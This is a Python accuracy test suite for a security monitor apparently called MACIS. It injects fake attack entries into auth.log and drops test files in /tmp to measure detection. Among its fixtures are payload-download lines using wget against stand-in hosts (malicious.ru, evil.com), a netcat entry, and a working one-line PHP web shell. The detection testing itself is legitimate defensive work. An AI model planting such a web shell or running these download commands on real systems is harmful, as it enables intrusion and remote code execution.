#!/usr/bin/env python3
"""
MACIS Accuracy Test Suite
=========================
Injects known attack signatures → triggers MACIS scan → measures detection rate.

Usage:
    python test_accuracy.py                        # run all tests
    python test_accuracy.py --host http://localhost:8000
    python test_accuracy.py --no-cleanup           # keep injected log lines after test
    python test_accuracy.py --log-path /var/log/auth.log
    python test_accuracy.py --only log             # run only log tests
"""

import argparse
import json
import os
import sys
import time
from datetime import datetime
from typing import Optional

import requests

# ── ANSI Colors ───────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# ── Test Cases: Log Injection ─────────────────────────────────────────────────
# Mirrors SIGNATURES dict in log_analysis_tool.py exactly

LOG_INJECTION_TESTS = [
    {
        "id":          "TC-001",
        "name":        "SSH Brute Force",
        "threat_type": "brute_force_ssh",
        "severity":    "HIGH",   # escalates to HIGH at >50 attempts
        "inject_lines": [
            f"Jan 15 10:{i:02d}:01 server sshd[1234]: Failed password for admin "
            f"from 192.168.1.100 port 22 ssh2"
            for i in range(60)
        ],
    },
    {
        "id":          "TC-002",
        "name":        "SSH Root Login Attempt",
        "threat_type": "ssh_root_attempt",
        "severity":    "HIGH",
        "inject_lines": [
            "Jan 15 10:01:01 server sshd[1234]: Failed password for root from 10.0.0.99 port 22 ssh2",
            "Jan 15 10:01:05 server sshd[1234]: Failed password for root from 10.0.0.99 port 22 ssh2",
        ],
    },
    {
        "id":          "TC-003",
        "name":        "Successful Root Login (CRITICAL)",
        "threat_type": "successful_root_login",
        "severity":    "CRITICAL",
        "inject_lines": [
            "Jan 15 10:05:00 server sshd[5678]: Accepted password for root from 203.0.113.42 port 22 ssh2",
        ],
    },
    {
        "id":          "TC-004",
        "name":        "Privilege Escalation (sudo fail)",
        "threat_type": "privilege_escalation",
        "severity":    "HIGH",
        "inject_lines": [
            "Jan 15 10:10:00 server sudo:   ubuntu : authentication failure; logname=ubuntu uid=1000",
            "Jan 15 10:10:02 server sudo:   ubuntu : FAILED ; TTY=pts/0 ; PWD=/home/ubuntu ; USER=root",
        ],
    },
    {
        "id":          "TC-005",
        "name":        "Malware Process (netcat/wget)",
        "threat_type": "malware_process",
        "severity":    "CRITICAL",
        "inject_lines": [
            "Jan 15 10:15:00 server kernel: audit: process netcat executed by uid=1000",
            "Jan 15 10:15:01 server bash[9999]: wget http://malicious.ru/payload.sh",
        ],
    },
    {
        "id":          "TC-006",
        "name":        "New User Account Created",
        "threat_type": "new_account_created",
        "severity":    "MEDIUM",
        "inject_lines": [
            "Jan 15 10:20:00 server useradd[1111]: new user: name=backdooruser, UID=1002, GID=1002",
        ],
    },
    {
        "id":          "TC-007",
        "name":        "Cron Modification by Root",
        "threat_type": "cron_modification",
        "severity":    "LOW",
        "inject_lines": [
            "Jan 15 10:25:00 server CRON[2222]: (root) CMD (wget http://evil.com/update.sh -O /tmp/u.sh)",
        ],
    },
    {
        "id":          "TC-009",
        "name":        "Port Scan / Brute Force (network via auth.log)",
        "threat_type": "port_scan_or_brute_force",
        "severity":    "HIGH",
        "inject_lines": [
            f"Jan 15 11:{i:02d}:00 server sshd[{3000+i}]: Invalid user scanner "
            f"from 172.16.0.55 port {40000+i}"
            for i in range(55)
        ],
    },
]

# ── Test Cases: Filesystem ────────────────────────────────────────────────────

FILESYSTEM_TESTS = [
    {
        "id":          "TC-010",
        "name":        "Executable File in /tmp",
        "threat_type": "executable_in_tmp",
        "severity":    "HIGH",
        "path":        "/tmp/macis_test_payload",
        "mode":        0o755,
        "content":     "#!/bin/bash\necho macis_test\n",
    },
    {
        "id":          "TC-011",
        "name":        "Web Shell Signature in /tmp",
        "threat_type": "web_shell_detected",
        "severity":    "CRITICAL",
        "path":        "/tmp/macis_test_shell.php",
        "mode":        0o644,
        "content":     "<?php system($_GET['cmd']); ?>",
    },
]

# ── Helpers ────────────────────────────────────────────────────────────────────

def hdr(text):
    print(f"\n{BOLD}{CYAN}{'='*58}{RESET}")
    print(f"{BOLD}{CYAN}  {text}{RESET}")
    print(f"{BOLD}{CYAN}{'='*58}{RESET}")

def ok(msg):  print(f"  {GREEN}✓ PASS{RESET}  {msg}")
def err(msg): print(f"  {RED}✗ FAIL{RESET}  {msg}")
def skip(msg):print(f"  {YELLOW}⚠ SKIP{RESET}  {msg}")
def info(msg):print(f"  {BLUE}ℹ{RESET}  {msg}")


def inject_lines(log_path: str, lines: list) -> list:
    try:
        os.makedirs(os.path.dirname(log_path) if os.path.dirname(log_path) else ".", exist_ok=True)
        with open(log_path, "a") as f:
            for l in lines:
                f.write(l + "\n")
        return lines
    except PermissionError:
        skip(f"Cannot write to {log_path} — try: sudo python test_accuracy.py")
        return []
    except Exception as e:
        skip(f"Inject failed for {log_path}: {e}")
        return []


def remove_lines(log_path: str, lines: list):
    try:
        with open(log_path, "r", errors="ignore") as f:
            content = f.readlines()
        line_set = set(l + "\n" for l in lines)
        with open(log_path, "w") as f:
            f.writelines(l for l in content if l not in line_set)
    except Exception as e:
        skip(f"Cleanup failed {log_path}: {e}")


def create_file(path: str, mode: int, content: str) -> bool:
    try:
        with open(path, "w") as f:
            f.write(content)
        os.chmod(path, mode)
        return True
    except Exception as e:
        skip(f"Cannot create {path}: {e}")
        return False


def trigger_scan(host: str, log_paths: str, hours: int = 1) -> Optional[str]:
    try:
        r = requests.post(
            f"{host}/run",
            json={"mode": "detect", "log_paths": log_paths, "scan_hours": hours},
            timeout=10,
        )
        r.raise_for_status()
        return r.json()["job_id"]
    except Exception as e:
        err(f"POST /run failed: {e}")
        return None


def poll_job(host: str, job_id: str, timeout: int = 300) -> Optional[dict]:
    deadline = time.time() + timeout
    info(f"Polling job {job_id[:8]} (timeout={timeout}s)")
    while time.time() < deadline:
        try:
            r = requests.get(f"{host}/results/{job_id}", timeout=10)
            r.raise_for_status()
            job = r.json()
            status = job.get("status")
            phase  = job.get("phase", "")
            print(f"    {BLUE}→ {status} / {phase}{RESET}          ", end="\r")
            if status in ("completed", "failed"):
                print()
                return job
        except Exception as e:
            err(f"Poll error: {e}")
            return None
        time.sleep(5)
    print()
    err(f"Job {job_id[:8]} timed out after {timeout}s")
    return None


def detection_found(job: dict, threat_type: str) -> bool:
    """Search detection_report and result for threat_type keyword."""
    haystack = " ".join([
        job.get("detection_report", "") or "",
        job.get("result", "") or "",
    ]).lower()
    needle = threat_type.lower().replace("_", " ")
    return needle in haystack or threat_type.lower() in haystack


# ── Test Runners ───────────────────────────────────────────────────────────────

def run_log_tests(host, log_path, cleanup) -> tuple:
    hdr("LOG + NETWORK DETECTION TESTS  (TC-001 to TC-009)")
    p = f = s = 0
    injected = []

    for tc in LOG_INJECTION_TESTS:
        lines = inject_lines(log_path, tc["inject_lines"])
        if lines:
            injected.extend(lines)
            info(f"{tc['id']} — injected {len(lines)} lines ({tc['name']})")
        else:
            s += 1

    if not injected:
        skip("No lines injected — skipping log scan")
        return 0, 0, len(LOG_INJECTION_TESTS)

    job_id = trigger_scan(host, log_path, hours=1)
    if not job_id:
        return 0, len(LOG_INJECTION_TESTS), 0

    job = poll_job(host, job_id)
    if not job or job.get("status") == "failed":
        err(f"Scan failed: {job.get('error') if job else 'timeout'}")
        if cleanup: remove_lines(log_path, injected)
        return 0, len(LOG_INJECTION_TESTS) - s, s

    for tc in LOG_INJECTION_TESTS:
        label = f"{tc['id']} {tc['name']} [{tc['severity']}]"
        if detection_found(job, tc["threat_type"]):
            p += 1
            ok(label)
        else:
            f += 1
            err(f"{label}  ← not found in report")

    if cleanup:
        remove_lines(log_path, injected)
        info(f"Cleaned {len(injected)} injected lines from {log_path}")

    return p, f, s


def run_filesystem_tests(host, log_path, cleanup) -> tuple:
    hdr("FILESYSTEM MONITOR TESTS  (TC-010 to TC-011)")
    p = f = s = 0
    created = []

    for tc in FILESYSTEM_TESTS:
        if create_file(tc["path"], tc["mode"], tc["content"]):
            created.append(tc["path"])
            info(f"{tc['id']} — created {tc['path']} mode={oct(tc['mode'])}")
        else:
            s += 1

    if not created:
        skip("No test files created — skipping filesystem scan")
        return 0, 0, len(FILESYSTEM_TESTS)

    job_id = trigger_scan(host, log_path, hours=1)
    if not job_id:
        return 0, len(FILESYSTEM_TESTS), 0

    job = poll_job(host, job_id)
    if not job or job.get("status") == "failed":
        err(f"Scan failed: {job.get('error') if job else 'timeout'}")
        if cleanup:
            for path in created: 
                try: os.remove(path)
                except: pass
        return 0, len(FILESYSTEM_TESTS) - s, s

    for tc in FILESYSTEM_TESTS:
        if tc["path"] not in created:
            continue
        label = f"{tc['id']} {tc['name']} [{tc['severity']}]"
        if detection_found(job, tc["threat_type"]):
            p += 1
            ok(label)
        else:
            f += 1
            err(f"{label}  ← not found in report")

    if cleanup:
        for path in created:
            try:
                os.remove(path)
                info(f"Removed {path}")
            except: pass

    return p, f, s


def run_pipeline_tests(host) -> tuple:
    hdr("PIPELINE CORRECTNESS TESTS")
    p = f = s = 0

    # T1: Health
    try:
        r = requests.get(f"{host}/health", timeout=5)
        if r.status_code == 200 and r.json().get("status") == "ok":
            p += 1; ok("GET /health → {status: ok}")
        else:
            f += 1; err(f"GET /health → {r.status_code}")
    except Exception as e:
        f += 1; err(f"GET /health: {e}")

    # T2: Job queued status
    clean_job_id = None
    try:
        r = requests.post(
            f"{host}/run",
            json={"mode": "detect", "log_paths": "/dev/null", "scan_hours": 1},
            timeout=10,
        )
        data = r.json()
        clean_job_id = data.get("job_id")
        if data.get("status") == "queued":
            p += 1; ok(f"POST /run → status=queued  job={clean_job_id[:8]}")
        else:
            f += 1; err(f"POST /run initial status={data.get('status')} expected 'queued'")
    except Exception as e:
        f += 1; err(f"POST /run: {e}")

    # T3: GET /jobs lists job
    if clean_job_id:
        try:
            time.sleep(2)
            r = requests.get(f"{host}/jobs", timeout=10)
            ids = [j["job_id"] for j in r.json().get("jobs", [])]
            if clean_job_id in ids:
                p += 1; ok(f"GET /jobs lists job {clean_job_id[:8]}")
            else:
                f += 1; err(f"GET /jobs missing job {clean_job_id[:8]}")
        except Exception as e:
            f += 1; err(f"GET /jobs: {e}")

    # T4: Scheduler running
    try:
        r = requests.get(f"{host}/scheduler", timeout=5)
        if r.json().get("running"):
            p += 1; ok("GET /scheduler → running=True")
        else:
            f += 1; err("Scheduler not running")
    except Exception as e:
        s += 1; skip(f"GET /scheduler: {e}")

    # T5: Clean scan should NOT escalate
    if clean_job_id:
        job = poll_job(host, clean_job_id, timeout=120)
        if job:
            escalated = job.get("escalated")
            status    = job.get("status")
            if status == "completed" and escalated is False:
                p += 1; ok("Clean scan → escalated=False (Phase 2 correctly skipped)")
            elif status == "completed" and escalated is True:
                f += 1; err("Clean scan wrongly escalated to Phase 2")
            else:
                s += 1; skip(f"Escalation check inconclusive: status={status} escalated={escalated}")
        else:
            s += 1; skip("Poll timed out for escalation check")

    # T6: Severity extraction — must be present in completed job
    if clean_job_id:
        try:
            r = requests.get(f"{host}/results/{clean_job_id}", timeout=5)
            job = r.json()
            if "severity" in job or job.get("status") == "completed":
                p += 1; ok(f"Job result contains severity field or completed cleanly")
            else:
                f += 1; err("Job result missing severity field")
        except Exception as e:
            s += 1; skip(f"Results check: {e}")

    return p, f, s


# ── Summary ────────────────────────────────────────────────────────────────────

def print_summary(results: dict):
    hdr("ACCURACY REPORT")
    tp = tf = ts = 0

    for cat, (p, f, s) in results.items():
        total = p + f + s
        rate  = (p / (p + f) * 100) if (p + f) > 0 else 0
        filled = int(30 * rate / 100)
        bar   = f"{GREEN}{'█' * filled}{RESET}{'░' * (30 - filled)}"
        print(f"\n  {BOLD}{cat}{RESET}")
        print(f"    [{bar}] {rate:.1f}%")
        print(f"    {GREEN}Pass={p}{RESET}  {RED}Fail={f}{RESET}  {YELLOW}Skip={s}{RESET}  Total={total}")
        tp += p; tf += f; ts += s

    overall = (tp / (tp + tf) * 100) if (tp + tf) > 0 else 0
    color   = GREEN if overall >= 80 else (YELLOW if overall >= 60 else RED)

    print(f"\n  {BOLD}{'─'*50}{RESET}")
    print(f"  {BOLD}OVERALL DETECTION ACCURACY: {color}{overall:.1f}%{RESET}{BOLD} "
          f"({tp}/{tp+tf} detected)  Skipped: {YELLOW}{ts}{RESET}")
    print()

    report = {
        "timestamp": datetime.now().isoformat(),
        "overall_accuracy_pct": round(overall, 2),
        "total_passed": tp,
        "total_failed": tf,
        "total_skipped": ts,
        "categories": {k: {"passed": p, "failed": f, "skipped": s}
                       for k, (p, f, s) in results.items()},
    }
    fname = f"macis_accuracy_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w") as fp:
        json.dump(report, fp, indent=2)
    print(f"  {BLUE}JSON report saved → {fname}{RESET}\n")


# ── Main ───────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description="MACIS Accuracy Test Suite")
    ap.add_argument("--host",       default="http://localhost:8000")
    ap.add_argument("--log-path",   default="/var/log/auth.log")
    ap.add_argument("--no-cleanup", action="store_true")
    ap.add_argument("--skip-fs",    action="store_true")
    ap.add_argument("--only",       choices=["log", "fs", "pipeline"])
    args = ap.parse_args()
    cleanup = not args.no_cleanup

    print(f"\n{BOLD}{CYAN}MACIS ACCURACY TEST SUITE{RESET}")
    print(f"  Host:    {args.host}")
    print(f"  Log:     {args.log_path}")
    print(f"  Cleanup: {cleanup}")
    print(f"  Time:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    # Reachability check
    try:
        requests.get(f"{args.host}/health", timeout=5).raise_for_status()
        info(f"API reachable ✓")
    except Exception as e:
        print(f"\n{RED}{BOLD}Cannot reach MACIS at {args.host}{RESET}")
        print(f"  Start it first:  docker-compose up")
        print(f"  Error: {e}\n")
        sys.exit(1)

    results = {}

    if not args.only or args.only == "log":
        results["Log + Network Detection"] = run_log_tests(args.host, args.log_path, cleanup)

    if (not args.only or args.only == "fs") and not args.skip_fs:
        results["Filesystem Monitor"] = run_filesystem_tests(args.host, args.log_path, cleanup)

    if not args.only or args.only == "pipeline":
        results["Pipeline Correctness"] = run_pipeline_tests(args.host)

    print_summary(results)


if __name__ == "__main__":
    main()